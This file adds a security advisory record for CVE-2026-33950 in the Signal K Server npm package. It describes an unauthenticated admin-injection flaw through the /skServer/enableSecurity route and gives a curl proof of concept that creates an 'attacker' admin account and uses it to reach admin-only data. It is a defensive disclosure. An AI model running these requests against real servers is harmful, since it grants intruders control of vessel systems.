@@ -1,0 +1,276 @@
+advisory_id: GHSA-x8hc-fqv3-7gwf
+datasource_id: github_osv/GHSA-x8hc-fqv3-7gwf
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-x8hc-fqv3-7gwf/GHSA-x8hc-fqv3-7gwf.json
+aliases:
+  - CVE-2026-33950
+summary: "Signal K Server: Privilege Escalation by Admin Role Injection via /enableSecurity\n\
+  ## Summary\n\nAccording to SignalK's security documentation, when a server is first initialized\
+  \ without security enabled, the **/skServer/enableSecurity** endpoint is intentionally exposed\
+  \ to allow the owner to set up the initial admin account. This initial open access is by design.\n\
+  \nHowever, the critical vulnerability is that this route is never deregistered or disabled\
+  \ after the initial successful setup. Even after the genuine administrator has created their\
+  \ account, restarted the server, and activated token security, the **/skServer/enableSecurity**\
+  \ route remains perpetually open.\n\nFurthermore, the endpoint explicitly trusts the **type**\
+  \ field provided in the request body, passing it directly into the server's security configuration\
+  \ without validation. Because the route remains permanently listening, any unauthenticated\
+  \ user can call this endpoint at any time to silently inject a new, fully privileged admin\
+  \ account alongside the legitimate ones.\n\n## Vulnerable Root Cause \n\nFile:  src/serverroutes.ts\
+  \ (Lines 685-754)\n```\nif (app.securityStrategy.getUsers(getSecurityConfig(app)).length ===\
+  \ 0) {\n    app.post(\n      `${SERVERROUTESPREFIX}/enableSecurity`,\n      (req: Request,\
+  \ res: Response) => {\n        // ...\n        function addUser(request: Request, response:\
+  \ Response, securityStrategy: SecurityStrategy, config?: any) {\n          // [!VULNERABLE]\
+  \ Passes the entire JSON request body directly to the security strategy\n          securityStrategy.addUser(config,\
+  \ request.body, (err, theConfig) => {\n            // ...\n          })\n        }\n     \
+  \ }\n    // ... No code disables or removes this route after first execution.\n    // The\
+  \ conditional check on Line 685 only happens during server startup, \n```\n\nFile: src/tokensecurity.ts\
+  \ (Lines 980-994)\n```\nfunction addUser(\n    theConfig: SecurityConfig,\n    user: { userId:\
+  \ string; type: string; password?: string },\n    callback: ICallback<SecurityConfig>\n  ):\
+  \ void {\n    // ...\n    const newUser: User = {\n      username: user.userId,\n      type:\
+  \ user.type // [!VULNERABLE] Blindly trusts the injected \"type\" field\n    }\n```\n\n##\
+  \ Proof of Concept (PoC)\n\n**Simulate Legitimate Initial Setup**: Send a POST request to\
+  \ the open enableSecurity route defining the initial legitimate admin account.\n```\ncurl\
+  \ -X POST http://localhost:3000/skServer/enableSecurity \\\n  -H \"Content-Type: application/json\"\
+  \ \\\n  -d '{\"userId\": \"admin\", \"password\": \"securepassword\", \"type\": \"admin\"\
+  }'\n\nResult: Security enabled\n```\n\n**Inject Malicious Admin**: Send the exact same request\
+  \ again to create a second, unauthorized admin account. This should ideally be blocked because\
+  \ security was already enabled.\n\n```\ncurl -X POST http://localhost:3000/skServer/enableSecurity\
+  \ \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"userId\": \"attacker\", \"password\"\
+  : \"password123\", \"type\": \"admin\"}'\n\nResult: Security enabled (The vulnerability: The\
+  \ server fails to reject the request and creates the second admin).\n```\n\n**Verify Both\
+  \ Admins Exist**: Login via JWT as the attacker and query the restricted users endpoint.\n\
+  \n```\n# Get Token for Attacker\nTOKEN=$(curl -s -X POST http://localhost:3000/signalk/v1/auth/login\
+  \ \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\": \"attacker\", \"password\"\
+  : \"password123\"}' | jq -r .token)\n```\n```\n# Access Admin-Only Data\ncurl -H \"Authorization:\
+  \ Bearer $TOKEN\" http://localhost:3000/skServer/security/users\nResult: The system returns\
+  \ both admin and attacker as active Administrators.\n```\n\n<img width=\"1205\" height=\"\
+  469\" alt=\"Screenshot 2026-03-24 145906\" src=\"https://github.com/user-attachments/assets/98855e54-cb78-4786-a9e3-63dcc1bed37a\"\
+  \ />\n\n## Security Impact\nAn unauthenticated attacker can gain full Administrator access\
+  \ to the SignalK server at any time, allowing them to modify sensitive vessel routing data,\
+  \ alter server configurations, and access restricted endpoints"
+impacted_packages:
+  - purl: pkg:npm/signalk-server
+    affected_versions: vers:npm/<2.24.0-beta.4
+    fixed_versions: vers:npm/2.24.0-beta.4
+    affected_packages:
+      - pkg:npm/signalk-server@0.1.24
+      - pkg:npm/signalk-server@0.1.27
+      - pkg:npm/signalk-server@0.1.28
+      - pkg:npm/signalk-server@0.1.29
+      - pkg:npm/signalk-server@0.1.30
+      - pkg:npm/signalk-server@0.1.31
+      - pkg:npm/signalk-server@0.1.32
+      - pkg:npm/signalk-server@1.0.0-0
+      - pkg:npm/signalk-server@1.0.0-1
+      - pkg:npm/signalk-server@1.0.0-2
+      - pkg:npm/signalk-server@1.0.0-3
+      - pkg:npm/signalk-server@1.0.0-4
+      - pkg:npm/signalk-server@1.0.0
+      - pkg:npm/signalk-server@1.1.0
+      - pkg:npm/signalk-server@1.1.1
+      - pkg:npm/signalk-server@1.1.2
+      - pkg:npm/signalk-server@1.2.0
+      - pkg:npm/signalk-server@1.2.1
+      - pkg:npm/signalk-server@1.2.2
+      - pkg:npm/signalk-server@1.2.3
+      - pkg:npm/signalk-server@1.2.4
+      - pkg:npm/signalk-server@1.3.0
+      - pkg:npm/signalk-server@1.4.0
+      - pkg:npm/signalk-server@1.4.1
+      - pkg:npm/signalk-server@1.4.2
+      - pkg:npm/signalk-server@1.4.3
+      - pkg:npm/signalk-server@1.5.0
+      - pkg:npm/signalk-server@1.6.0
+      - pkg:npm/signalk-server@1.7.0
+      - pkg:npm/signalk-server@1.7.1
+      - pkg:npm/signalk-server@1.8.0
+      - pkg:npm/signalk-server@1.9.0
+      - pkg:npm/signalk-server@1.9.1
+      - pkg:npm/signalk-server@1.10.0
+      - pkg:npm/signalk-server@1.10.1
+      - pkg:npm/signalk-server@1.10.2
+      - pkg:npm/signalk-server@1.11.0
+      - pkg:npm/signalk-server@1.12.0
+      - pkg:npm/signalk-server@1.13.0
+      - pkg:npm/signalk-server@1.13.1
+      - pkg:npm/signalk-server@1.14.0
+      - pkg:npm/signalk-server@1.15.0
+      - pkg:npm/signalk-server@1.16.0
+      - pkg:npm/signalk-server@1.17.0
+      - pkg:npm/signalk-server@1.18.0-beta.1
+      - pkg:npm/signalk-server@1.18.0-beta.2
+      - pkg:npm/signalk-server@1.18.0-beta.3
+      - pkg:npm/signalk-server@1.18.0-beta.4
+      - pkg:npm/signalk-server@1.18.0-beta.5
+      - pkg:npm/signalk-server@1.18.0-beta.6
+      - pkg:npm/signalk-server@1.18.0
+      - pkg:npm/signalk-server@1.19.0-beta.1
+      - pkg:npm/signalk-server@1.19.0-beta.2
+      - pkg:npm/signalk-server@1.19.0
+      - pkg:npm/signalk-server@1.20.0
+      - pkg:npm/signalk-server@1.21.0
+      - pkg:npm/signalk-server@1.22.0
+      - pkg:npm/signalk-server@1.23.0
+      - pkg:npm/signalk-server@1.24.0
+      - pkg:npm/signalk-server@1.25.0
+      - pkg:npm/signalk-server@1.26.0
+      - pkg:npm/signalk-server@1.27.0
+      - pkg:npm/signalk-server@1.27.1
+      - pkg:npm/signalk-server@1.28.0-beta.1
+      - pkg:npm/signalk-server@1.28.0
+      - pkg:npm/signalk-server@1.29.0-beta.1
+      - pkg:npm/signalk-server@1.29.0
+      - pkg:npm/signalk-server@1.30.0
+      - pkg:npm/signalk-server@1.31.0
+      - pkg:npm/signalk-server@1.32.0
+      - pkg:npm/signalk-server@1.33.0-beta.1
+      - pkg:npm/signalk-server@1.33.0
+      - pkg:npm/signalk-server@1.34.0
+      - pkg:npm/signalk-server@1.35.0
+      - pkg:npm/signalk-server@1.35.1
+      - pkg:npm/signalk-server@1.35.2
+      - pkg:npm/signalk-server@1.36.0-beta.1
+      - pkg:npm/signalk-server@1.36.0-beta.2
+      - pkg:npm/signalk-server@1.36.0-beta.3
+      - pkg:npm/signalk-server@1.36.0
+      - pkg:npm/signalk-server@1.37.0-beta.1
+      - pkg:npm/signalk-server@1.37.0-beta.3
+      - pkg:npm/signalk-server@1.37.0
+      - pkg:npm/signalk-server@1.37.1
+      - pkg:npm/signalk-server@1.37.2
+      - pkg:npm/signalk-server@1.37.3
+      - pkg:npm/signalk-server@1.37.4
+      - pkg:npm/signalk-server@1.37.5
+      - pkg:npm/signalk-server@1.37.6
+      - pkg:npm/signalk-server@1.38.0
+      - pkg:npm/signalk-server@1.38.1
+      - pkg:npm/signalk-server@1.39.0
+      - pkg:npm/signalk-server@1.40.0
+      - pkg:npm/signalk-server@1.41.0-beta.2
+      - pkg:npm/signalk-server@1.41.0-beta.3
+      - pkg:npm/signalk-server@1.41.0-beta.4
+      - pkg:npm/signalk-server@1.41.0
+      - pkg:npm/signalk-server@1.41.1
+      - pkg:npm/signalk-server@1.41.2
+      - pkg:npm/signalk-server@1.41.3
+      - pkg:npm/signalk-server@1.42.0
+      - pkg:npm/signalk-server@1.43.0
+      - pkg:npm/signalk-server@1.44.0
+      - pkg:npm/signalk-server@1.45.0
+      - pkg:npm/signalk-server@1.46.2
+      - pkg:npm/signalk-server@1.46.3
+      - pkg:npm/signalk-server@2.0.0-beta.1
+      - pkg:npm/signalk-server@2.0.0-beta.2
+      - pkg:npm/signalk-server@2.0.0-beta.5
+      - pkg:npm/signalk-server@2.0.0-beta.6
+      - pkg:npm/signalk-server@2.0.0-beta.7
+      - pkg:npm/signalk-server@2.0.0-beta.9
+      - pkg:npm/signalk-server@2.0.0-beta.11
+      - pkg:npm/signalk-server@2.0.0-beta.12
+      - pkg:npm/signalk-server@2.0.0
+      - pkg:npm/signalk-server@2.1.0
+      - pkg:npm/signalk-server@2.1.1
+      - pkg:npm/signalk-server@2.2.0
+      - pkg:npm/signalk-server@2.3.0-beta.2
+      - pkg:npm/signalk-server@2.3.0-canboatv2.1
+      - pkg:npm/signalk-server@2.3.0
+      - pkg:npm/signalk-server@2.3.1
+      - pkg:npm/signalk-server@2.4.0
+      - pkg:npm/signalk-server@2.4.1
+      - pkg:npm/signalk-server@2.5.0
+      - pkg:npm/signalk-server@2.6.0
+      - pkg:npm/signalk-server@2.6.1
+      - pkg:npm/signalk-server@2.6.2
+      - pkg:npm/signalk-server@2.7.0
+      - pkg:npm/signalk-server@2.7.1
+      - pkg:npm/signalk-server@2.7.2
+      - pkg:npm/signalk-server@2.8.0
+      - pkg:npm/signalk-server@2.8.1
+      - pkg:npm/signalk-server@2.8.2
+      - pkg:npm/signalk-server@2.8.3
+      - pkg:npm/signalk-server@2.9.0
+      - pkg:npm/signalk-server@2.10.0
+      - pkg:npm/signalk-server@2.11.0
+      - pkg:npm/signalk-server@2.12.0
+      - pkg:npm/signalk-server@2.13.0-beta.1
+      - pkg:npm/signalk-server@2.13.0-beta.2
+      - pkg:npm/signalk-server@2.13.0-beta.3
+      - pkg:npm/signalk-server@2.13.0
+      - pkg:npm/signalk-server@2.13.1
+      - pkg:npm/signalk-server@2.13.2
+      - pkg:npm/signalk-server@2.13.3
+      - pkg:npm/signalk-server@2.13.4
+      - pkg:npm/signalk-server@2.13.5
+      - pkg:npm/signalk-server@2.14.0-beta.1
+      - pkg:npm/signalk-server@2.14.0
+      - pkg:npm/signalk-server@2.14.1
+      - pkg:npm/signalk-server@2.14.2
+      - pkg:npm/signalk-server@2.14.3
+      - pkg:npm/signalk-server@2.14.4
+      - pkg:npm/signalk-server@2.15.0-beta.1
+      - pkg:npm/signalk-server@2.15.0-beta.2
+      - pkg:npm/signalk-server@2.15.0-beta.3
+      - pkg:npm/signalk-server@2.15.0-beta.4
+      - pkg:npm/signalk-server@2.15.0-beta.5
+      - pkg:npm/signalk-server@2.15.0-beta.6
+      - pkg:npm/signalk-server@2.15.0
+      - pkg:npm/signalk-server@2.15.1
+      - pkg:npm/signalk-server@2.15.2
+      - pkg:npm/signalk-server@2.15.3
+      - pkg:npm/signalk-server@2.16.0
+      - pkg:npm/signalk-server@2.17.0
+      - pkg:npm/signalk-server@2.17.2
+      - pkg:npm/signalk-server@2.18.0
+      - pkg:npm/signalk-server@2.19.0-beta.1
+      - pkg:npm/signalk-server@2.19.0-beta.2
+      - pkg:npm/signalk-server@2.19.0-beta.4
+      - pkg:npm/signalk-server@2.19.0-beta.5
+      - pkg:npm/signalk-server@2.19.0
+      - pkg:npm/signalk-server@2.19.1
+      - pkg:npm/signalk-server@2.20.0-beta.1
+      - pkg:npm/signalk-server@2.20.0
+      - pkg:npm/signalk-server@2.20.1
+      - pkg:npm/signalk-server@2.20.2
+      - pkg:npm/signalk-server@2.20.3
+      - pkg:npm/signalk-server@2.21.0
+      - pkg:npm/signalk-server@2.21.1
+      - pkg:npm/signalk-server@2.21.2
+      - pkg:npm/signalk-server@2.21.3
+      - pkg:npm/signalk-server@2.22.0
+      - pkg:npm/signalk-server@2.22.1
+      - pkg:npm/signalk-server@2.23.0-beta.1
+      - pkg:npm/signalk-server@2.23.0-beta.2
+      - pkg:npm/signalk-server@2.23.0
+      - pkg:npm/signalk-server@2.24.0-beta.3
+    fixed_packages:
+      - pkg:npm/signalk-server@2.24.0-beta.4
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '9.4'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-x8hc-fqv3-7gwf/GHSA-x8hc-fqv3-7gwf.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-285
+  - CWE-862
+  - CWE-288
+references:
+  - url: https://github.com/SignalK/signalk-server
+    reference_type:
+    reference_id:
+  - url: https://github.com/SignalK/signalk-server/releases/tag/v2.24.0-beta.4
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-33950
+    reference_type:
+    reference_id: CVE-2026-33950
+  - url: https://github.com/SignalK/signalk-server/security/advisories/GHSA-x8hc-fqv3-7gwf
+    reference_type:
+    reference_id: GHSA-x8hc-fqv3-7gwf
+exploits: []
